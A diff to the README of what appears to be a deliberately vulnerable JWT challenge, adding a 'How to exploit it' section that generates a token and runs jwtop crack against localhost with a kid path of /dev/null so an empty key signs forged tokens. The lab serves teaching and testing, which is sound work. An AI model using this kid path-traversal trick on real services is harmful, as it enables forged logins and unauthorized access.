@@ -5,7 +5,17 @@ This challenge demonstrates a JWT implementation that is vulnerable to path trav
 ## How to run it
 
 ```bash
-go run main.go
+go run main.go serve
+```
+
+## How to exploit it
+
+```bash
+# Get a sample token
+TOKEN=$(go run main.go jwt)
+
+# Scan with jwtop — /dev/null (default) is read as empty bytes, becoming the HMAC key
+jwtop crack "$TOKEN" --url http://localhost:8080 --kid-path /dev/null
 ```
 
 ## Disclaimer
